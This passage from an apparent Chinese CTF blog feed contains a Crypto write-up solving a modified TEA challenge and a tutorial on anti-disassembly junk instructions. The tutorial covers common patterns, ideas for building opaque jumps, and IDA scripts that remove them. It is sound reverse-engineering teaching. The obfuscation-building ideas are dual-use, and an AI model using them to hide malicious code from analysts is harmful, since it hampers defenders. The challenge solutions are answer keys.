class="hljs-number">&#x27;</span><br><br><br>data=base64.b64decode(data)<br>decrypted = rc4(data, key)<br>print(decrypted)<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="week2-1"><a href="#week2-1" class="headerlink" title="week2"></a>week2</h2><h3 id="茶里茶气"><a href="#茶里茶气" class="headerlink" title="茶里茶气"></a>茶里茶气</h3><p>&gt;&gt;和tea的结合</p><p>因为%p，所以每一轮算完都小于p且是正数，那么只要小于0的时候+p即可，得到高低位后移位再相加即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># flag = &quot;flag&#123;*****&#125;&quot;</span><br><span class="hljs-comment"># assert len( flag ) == 25</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># a = &quot;&quot;</span><br><span class="hljs-comment"># for i in flag:</span><br><span class="hljs-comment">#     a += hex(ord(i))[2:]</span><br><span class="hljs-comment"># l = int(a,16).bit_length()</span><br><span class="hljs-comment"># print(&quot;l  =&quot; , l )</span><br><br><span class="hljs-comment"># v0 = int(a,16)&gt;&gt;(l//2)</span><br><span class="hljs-comment"># v1 = int(a,16)-(v0&lt;&lt;(l//2))</span><br><span class="hljs-comment"># p = getPrime(l//2+10)</span><br><br><br>derta = <span class="hljs-number">462861781278454071588539315363</span><br>v2 = derta*<span class="hljs-number">32</span><br>v3 = <span class="hljs-number">489552116384728571199414424951</span><br>v4 = <span class="hljs-number">469728069391226765421086670817</span><br>v5 = <span class="hljs-number">564098252372959621721124077407</span><br>v6 = <span class="hljs-number">335640247620454039831329381071</span><br><span class="hljs-comment"># assert v1 &lt; p and v0 &lt; p and derta &lt; p and v3 &lt; p and v4 &lt; p and v5 &lt; p and v6 &lt; p</span><br><br>v0 = <span class="hljs-number">190997821330413928409069858571234</span><br>v1 = <span class="hljs-number">137340509740671759939138452113480</span><br>p = <span class="hljs-number">446302455051275584229157195942211</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    v2 -= derta<br>    <span class="hljs-keyword">while</span> v2 &lt; <span class="hljs-number">0</span>:<br>        v2 += p<br>    v0 -= (v1+v2) ^ ( <span class="hljs-number">8</span>*v1 + v5 ) ^ ( (v1&gt;&gt;<span class="hljs-number">7</span>) + v6 )<br>    <span class="hljs-keyword">while</span> v0&lt;<span class="hljs-number">0</span>:<br>        v0+=p<br>    v1 -= (v0+v2) ^ ( <span class="hljs-number">8</span>*v0 + v3 ) ^ ( (v0&gt;&gt;<span class="hljs-number">7</span>) + v4 )<br>    <span class="hljs-keyword">while</span> v1&lt;<span class="hljs-number">0</span>:<br>        v1+=p<br><br><br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;v0 =&quot;</span> , v0 )<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;v1 =&quot;</span> , v1 )<br><br>v0_2_v1 = <span class="hljs-number">1014351839000028912764735400942</span>&lt;&lt;<span class="hljs-number">99</span><br>v1 = <span class="hljs-number">348231531876293114407512127357</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v0_2_v1+v1))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tea魔改</tag>
      
      <tag>blowfish加密</tag>
      
      <tag>爆破flag</tag>
      
      <tag>base64魔改</tag>
      
      <tag>关联信息攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>花指令</title>
    <link href="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>参考链接：</p><p><a href="https://blog.csdn.net/m0_51246873/article/details/127167749">https://blog.csdn.net/m0_51246873/article/details/127167749</a></p><p><a href="https://www.cnblogs.com/YenKoc/p/14136012.html">https://www.cnblogs.com/YenKoc/p/14136012.html</a></p><p><a href="https://www.xjx100.cn/news/40167.html?action=onClick">https://www.xjx100.cn/news/40167.html?action=onClick</a></p><p><a href="https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g">https://mp.weixin.qq.com/s/MUth1Qw-Fl2a5OrLw_2_0g</a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul><li>线性扫描算法：逐行反汇编（无法将数据和内容进行区分）</li><li>递归下降算法：根据一条指令是否被另一条指令引用来决定是否对其进行反汇编（难以准确定位）</li></ul><p>正是因为这两种反汇编的规格和缺陷机制，所以才导致了会有花指令的诞生</p><p><strong>花指令简单的说就是在代码中混入一些垃圾数据阻碍你的静态分析</strong></p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690873982788-dd770c8d-bb78-4af2-823a-f2f07ccfb7d7-17318416670861.png" class="" title="img"><h3 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h3><ul><li>0xE8 call + 4字节偏移地址</li><li>0xE9 jmp + 4字节偏移地址</li><li>0xEB jmp + 2字节偏移地址</li><li>0xFF15 call + 4字节地址</li><li>0xFF25 jmp + 4字节地址</li><li>0xcc int 3</li><li>0xe2 loop</li><li>0x0f84 jz</li><li>0x0f85 jnz</li></ul><p>指令也不一定唯一，比如上面有两种表示call的方式，0x74也能表示jz</p><h1 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h1><h3 id="1-简单jmp"><a href="#1-简单jmp" class="headerlink" title="1.简单jmp"></a>1.简单jmp</h3><p>OD能被骗过去，但是因为ida主要采用的是递归扫描的办法（会用线性扫描补充）所以能够正常识别</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132929883-c68c1e41-0162-4c74-913b-551c5afe5f80-17318416670873.png" class="" title="img"><h3 id="2-jx-jnx（x可为e-z-l）"><a href="#2-jx-jnx（x可为e-z-l）" class="headerlink" title="2.jx+jnx（x可为e,z,l）"></a>2.jx+jnx（x可为e,z,l）</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1710308207074-a45f1d13-e450-4c83-8d4e-3b531590a98a-17318416670875.png" class="" title="img"><p>jnz实际上是fake的，因为jz这个指令，让ida认为jz下面的是另外一个分支，所以这里将jz下面包括jz 全转化为代码</p><p>call指令按u，下一行按c，再nop call，把90转为数据，再按c变为nop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1710308276009-3e1cf075-5d20-4a29-9902-c3d243f64169-17318416670877.png" class="" title="img"><h3 id="3-call-add-esp，4或call-add-esp-n-retn"><a href="#3-call-add-esp，4或call-add-esp-n-retn" class="headerlink" title="3.call +add esp，4或call + add [esp], n + retn"></a>3.call +add esp，4或call + add [esp], n + retn</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132096401-0cbd1787-69f8-4b7f-80f1-c4d7af1f2d3c-17318416670879.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689132119030-6bfac8d1-f372-4c48-b08e-aada3cf8666b-173184166708711.png" class="" title="img"><p>2023.7.8凌武杯flower_tea</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1688832992845-dc3216df-b044-4b15-8e3f-c46c5273d912-173184166708713.png" class="" title="img"><p>这里call指令，其实本质就是jmp&amp;push 下一条指令的地址，但是这里其实就是一个jmp指令，push这条指令是多余的，需要add esp,4 调整堆栈，但是ida会默认把call 后面的那个地址当成一个函数</p><p>易语言自带的花指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">004010BF   .  E8 <span class="hljs-number">00000000</span>   call <span class="hljs-number">1111.004010</span>C4<br>004010C4  /$  <span class="hljs-number">830424</span> 06     add dword ptr ss:[esp],<span class="hljs-number">0x6</span><br>004010C8  \.  C3            retn<br>004010C9      B9            db B9<br></code></pre></td></tr></table></figure><p>可以看到这里的add，是将call 00h的返回的地址，也就是[esp]+0x6（add 的四个字节+C3 B9）</p><p>来实现一个跳转，到004010CA，对于这种，只需要将下面的特征码patch掉就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">E80000000083042406C3??<br></code></pre></td></tr></table></figure><h3 id="4-jmp-XXX（红色）"><a href="#4-jmp-XXX（红色）" class="headerlink" title="4.jmp XXX（红色）"></a>4.jmp XXX（红色）</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130406691-d483f269-7400-471d-921a-58becb8e1681-173184166708715.png" class="" title="img"><p>这也是一种非常常见的花指令，其实这里很明显就有问题，因为虚拟地址怎么可能那么大，我们来看一下花指令源代码</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130477926-fe2e0737-f5c7-4586-83d9-72b896e74670-173184166708717.png" class="" title="img"><p> 实际是e9在搞鬼，ida会默认将e9后面的4个字节当成地址，只要nop掉jmp(E9)就好了</p><p>题目练习：<a href="https://www.nssctf.cn/note/set/2970">https://www.nssctf.cn/note/set/2970</a></p><h3 id="5-stx-jx"><a href="#5-stx-jx" class="headerlink" title="5.stx&#x2F;jx"></a>5.stx&#x2F;jx</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689130320004-5dc18a4f-ac2c-4cb7-8065-9f523e82f2d0-173184166708721.png" class="" title="img"><p>clc是清除EFlags寄存器的carry位的标志，而jnb是根据cf&#x3D;&#x3D;0时跳转的，然而jnb这个分支指令，ida又将后面的部分认作成了另外的分支。</p><h3 id="6-汇编指令共用opcode"><a href="#6-汇编指令共用opcode" class="headerlink" title="6.汇编指令共用opcode"></a>6.汇编指令共用opcode</h3><p>inc eax和dec eax抵消影响，这种共用opcode确实比较麻烦</p><h1 id="创意"><a href="#创意" class="headerlink" title="创意"></a>创意</h1><h3 id="1-替换ret指令"><a href="#1-替换ret指令" class="headerlink" title="1.替换ret指令"></a>1.替换ret指令</h3><p>call指令的本质：push 函数返回地址然后jmp 函数地址</p><p>ret指令的本质： pop eip</p><p>所以我们可以在call指令之后，明白函数返回地址存放于esp，可以将值取出，用跳转指令跳转到该地址，即可代替ret指令</p><h3 id="2-控制标志寄存器跳转"><a href="#2-控制标志寄存器跳转" class="headerlink" title="2.控制标志寄存器跳转"></a>2.控制标志寄存器跳转</h3><p>这一部分需要精通标志寄存器，每一个操作码都会对相应的标志寄存器产生相应的影响，如果对标志寄存器足够熟练，就可以使用对应的跳转指令构造永恒跳转。</p><h3 id="3-利用函数返回确定值"><a href="#3-利用函数返回确定值" class="headerlink" title="3.利用函数返回确定值"></a>3.利用函数返回确定值</h3><p>有些函数返回值是确定的，比如我们<strong>自己写的函数</strong>，返回值可以是任意非零整数；如果我们故意传入一个<strong>不存在的模块</strong>名称，那么他就会返回一个确定的值NULL；另一方面，<strong>某些api函数</strong>，我们既然使用他，肯定就是一定要调用成功的，而这些api函数基本上只要调用成功就就会返回一个确定的零或者非零值，如MessageBox。这些都可以构造永恒跳转</p><h3 id="4-针对反编译"><a href="#4-针对反编译" class="headerlink" title="4.针对反编译"></a>4.针对反编译</h3><p>0x1165 开始的花指令和前面的花指令原来相似，这条花指令会使 IDA 误以为 0x116B 处的指令可能会执行，导致 IDA 的栈分析出现错误</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131712545-813564aa-eea6-4a1e-97a2-e32f0d8b267f-173184166708719.png" class="" title="img"><p>修复方法除了patch 外还有修改 ida 对栈的分析结果</p><p>在Options - General菜单中勾上Stack pointer选项可以查看每行指令执行之前的栈帧大小</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131809983-7cfe2182-9372-47af-948d-a4929bfaf1a0-173184166708723.png" class="" title="img"><p><strong>Alt + K</strong> 可以修改某条指令对栈指针的影响，从而消除这条花指令对反编译的影响。</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689131828475-4df12a32-cb43-4794-b74c-06ac9c412d4b-173184166708725.png" class="" title="img"><h1 id="清除"><a href="#清除" class="headerlink" title="清除"></a>清除</h1><h3 id="nop单字节-E8"><a href="#nop单字节-E8" class="headerlink" title="nop单字节(E8)"></a>nop单字节(E8)</h3><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689129981491-9780d557-5835-434d-b50c-347ec712839d-173184166708727.png" class="" title="img"><p>在0x401051设置为数据类型（快捷键D），将call 转成硬编码 E8  再将光标放到 db 0E8上 将E8改成 nop(90) 再次按C键（转化为代码类型）点yes 将硬编码修复成代码  </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1689129948281-3c96bdf6-b2d0-4ed6-b03a-96c09a113d05-173184166708729.png" class="" title="img"><p> 然后向下逐⼀修复 将光标放置在黄色的行上 按C修复 直到没有黄色地址  </p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690874316013-0dc03fcc-d61c-4258-8871-9317f39fb4d0-173184166708731.png" class="" title="img"><p>最后全选函数，按P生成函数  </p><p>练习题目：<a href="https://www.nssctf.cn/problem/2313">https://www.nssctf.cn/problem/2313</a></p><h3 id="nop跨越汇编指令"><a href="#nop跨越汇编指令" class="headerlink" title="nop跨越汇编指令"></a>nop跨越汇编指令</h3><p>jz指令指向下一条指令中间</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721640647545-dd50b515-f521-4501-b0ac-ade8f929332c-173184166708733.png" class="" title="img"><p>这个时候让jz正常分析，也就是把中间的nop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721640588103-58532352-feaa-4624-8ee7-324144d86673-173184166708735.png" class="" title="img"><p>如果后面有数据没被分析为code，需要重新分析一下</p><h3 id="nop部分汇编"><a href="#nop部分汇编" class="headerlink" title="nop部分汇编"></a>nop部分汇编</h3><p>一般去菜单中的编辑选项修补单字节会比较好把控</p><p>像下面这种红色标志离原函数有一定距离又是call+retn组合，400f64又没什么用，还有ret会干扰函数的分析，那就都nop，是一种暴力破解方法</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1680614545893-5a9467cb-a38f-4a66-9ebc-5506ba940905-173184166708737.png" class="" title="img"><p>nop完后看到有%lld,删除函数，修补函数即可反编译</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1695203286928-b18e1793-6220-4139-97b7-d909022c273d-173184166708739.png" class="" title="img"><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721878266076-1962ee79-d068-49ba-9302-a5df50bc55b1-173184166708741.png" class="" title="img"><p>xchg很少用到，后面还有retn，主打不想要的直接全部nop</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1721878843936-e7e7246a-ab3e-410d-88c1-171b5cbabba5-173184166708743.png" class="" title="img"><p>先可以小范围的尝试，把call到红色的地方先nop，发现不行，再从头把关键数据之前（D7,flag is上面那一行)也给nop掉，发现可以了</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1690696323005-2d1cf95f-3233-4c21-9000-ce3fafa87e2e-173184166708745.png" class="" title="img"><h3 id="根据汇编指令"><a href="#根据汇编指令" class="headerlink" title="根据汇编指令"></a>根据汇编指令</h3><p>这里汇编语句之间突然有db有点可疑，而48表示mov，一般是开头的机器码</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1722916980055-d0de8f1f-279a-4d7f-a0a5-7f7a0cf4c771-173184166708747.png" class="" title="img"><p>这里把0x12以下的重新分析，就可以得到key</p><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1722917002876-cfa0e989-69ba-4b1a-9102-4580be626109-173184166708749.png" class="" title="img"><h3 id="代码自动去花"><a href="#代码自动去花" class="headerlink" title="代码自动去花"></a>代码自动去花</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;idc.idc&gt;</span><br>static main()&#123;<br>auto addr_start =<span class="hljs-number">0x00415990</span>;//函数起始地址<br>auto addr_end = <span class="hljs-number">0x00416048</span>;//函数结束地址<br>auto i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=addr_start;i&lt;addr_end;i++)&#123;<br>          <span class="hljs-keyword">if</span>(Dword(i) == <span class="hljs-number">0x1E8</span>)&#123;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">6</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">4</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">3</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">10</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">3</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;<br>              i=i+<span class="hljs-number">5</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">1</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;  <br>              i=i+<span class="hljs-number">3</span>;<br>              <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span> ; j&lt;<span class="hljs-number">2</span>; j++,i++ )&#123;<br>                  PatchByte(i,<span class="hljs-number">0x90</span>);<br>              &#125;    <br>              i--;    <br>          &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/10/22/%E8%8A%B1%E6%8C%87%E4%BB%A4/1708908062701-c3a60020-c29f-423a-8530-75efd5c88945-173184166708751.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ida_bytes <span class="hljs-keyword">import</span> get_bytes,patch_bytes<br>start= <span class="hljs-number">0x401000</span><br>end = <span class="hljs-number">0x422000</span><br>buf = get_bytes(start,end-start)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_at</span>(<span class="hljs-params">p,ln</span>):<br>    <span class="hljs-keyword">global</span> buf<br>    buf = buf[:p]+<span class="hljs-string">b&quot;\x90&quot;</span>*ln+buf[p+ln:]<br><br>fake_jcc=[]<br><span class="hljs-keyword">for</span> opcode <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x70</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">2</span>):<br>    pattern = <span class="hljs-built_in">chr</span>(opcode)+<span class="hljs-string">&quot;\x03&quot;</span>+<span class="hljs-built_in">chr</span>(opcode|<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;\x01&quot;</span><br>    fake_jcc.append(pattern.encode())<br>    pattern = <span class="hljs-built_in">chr</span>(opcode|<span class="hljs-number">1</span>)+<span class="hljs-string">&quot;\x03&quot;</span>+<span class="hljs-built_in">chr</span>(opcode)+<span class="hljs-string">&quot;\x01&quot;</span><br>    fake_jcc.append(pattern.encode())<br><br><span class="hljs-built_in">print</span>(fake_jcc)<br><span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> fake_jcc:<br>    p = buf.find(pattern)<br>    <span class="hljs-keyword">while</span> p != -<span class="hljs-number">1</span>:<br>        patch_at(p,<span class="hljs-number">5</span>)<br>        p = buf.find(pattern,p+<span class="hljs-number">1</span>)<br><br>patch_bytes(start,buf)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done&quot;</span>) <br></code></pre></td></tr></table></figure><p>去常见花指令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> keystone<br><span class="hljs-keyword">import</span> capstone<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_x86</span>():<br>    <span class="hljs-keyword">global</span> ks, cs<br>    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)<br>    cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32)<br><br>set_x86()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">asm</span>(<span class="hljs-params">code, addr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(ks.asm(code, addr)[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm</span>(<span class="hljs-params">code, addr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs.disasm(code, addr):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;%s %s&#x27;</span> %(i.mnemonic, i.op_str))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MakeCode</span>(<span class="hljs-params">ea</span>):<br>    <span class="hljs-keyword">return</span> idc.create_insn(ea)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm_at</span>(<span class="hljs-params">addr</span>):<br>    size = MakeCode(addr)<br>    code = idc.get_bytes(addr, size)<br>    <span class="hljs-keyword">return</span> addr + size, disasm(code, addr)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">disasm_block</span>(<span class="hljs-params">start, end</span>):<br>    codes = []<br>    addr = start<br>    <span class="hljs-keyword">while</span> addr &lt; end:<br>        _addr, code = disasm_at(addr)<br>        codes.append((addr, code))<br>        addr = _addr<br>    <span class="hljs-keyword">return</span> codes<br><br><br>addr = <span class="hljs-number">0x4010b0</span><br>end = <span class="hljs-number">0x402e41</span><br><span class="hljs-keyword">while</span> addr &lt; end:<br>    ida_bytes.del_items(addr, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>)<br>    size = MakeCode(addr)<br>    <span class="hljs-keyword">assert</span> size, <span class="hljs-built_in">hex</span>(addr)<br>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> ida_bytes.get_bytes(addr, <span class="hljs-number">3</span>) == <span class="hljs-string">b&#x27;\xf9\x72\x01&#x27;</span>: <span class="hljs-comment"># stc; jb $+3</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">elif</span> ida_bytes.get_bytes(addr, <span class="hljs-number">3</span>) == <span class="hljs-string">b&#x27;\xf8\x73\x01&#x27;</span>: <span class="hljs-comment"># clc; jnb $+3</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">4</span>)<br>        <span class="hljs-keyword">else</span>:<br>            addr += size<br>    <span class="hljs-keyword">elif</span> size == <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> ida_bytes.get_bytes(addr, <span class="hljs-number">2</span>) == <span class="hljs-string">b&#x27;\xeb\x01&#x27;</span>: <span class="hljs-comment"># jmp $+3</span><br>        ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">elif</span> size == <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">if</span> ida_bytes.get_bytes(addr, <span class="hljs-number">10</span>) == <span class="hljs-string">b&#x27;\xe8\x00\x00\x00\x00\x83\x04\x24\x06\xc3&#x27;</span>: <span class="hljs-comment"># call $+5; add dword ptr [esp], 6; ret</span><br>            ida_bytes.patch_bytes(addr, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">11</span>)<br>        <span class="hljs-keyword">else</span>:<br>            addr += size<br>    <span class="hljs-keyword">else</span>:<br>        addr += size<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done.&#x27;</span>)<br></code></pre></td></tr></table></figure><ol><li>定义了一个名为f的函数，用于执行二进制搜索并对匹配的位置进行nop</li></ol><ul><li><ul><li>begin_addr是搜索开始的地址。</li><li>end_addr是搜索结束的地址。</li><li>hexStr是用于搜索的十六进制模式字符串（用空格分开，其中??表示通配符，注意不可以使用诸如2?这样的情况）</li></ul></li></ul><ol><li>接着，将hexStr转换为两个字节数组：bMask和bPattern。bMask是用于表示可变字节的，其中00表示需要匹配的字节，01表示不需要匹配的字节；bPattern则是用于搜索的固定字节序列</li><li>定义了一个signs变量，用于指定搜索的标志位，其中BIN_SEARCH_FORWARD表示向前搜索，BIN_SEARCH_NOBREAK表示不允许搜索中途中断，BIN_SEARCH_NOSHOW表示不显示搜索结果</li><li>接着使用ida_bytes.bin_search函数进行二进制搜索，从begin_addr到end_addr之间搜索bPattern，其中可变字节由bMask指定。搜索到匹配的位置后，将其打印出来，并调用patch函数对其进行补丁操作</li><li>最后更新begin_addr为下一个搜索的起始地址，通常为当前匹配位置加上一个偏移量</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ida_bytes<br><span class="hljs-keyword">import</span> ida_ida<br><span 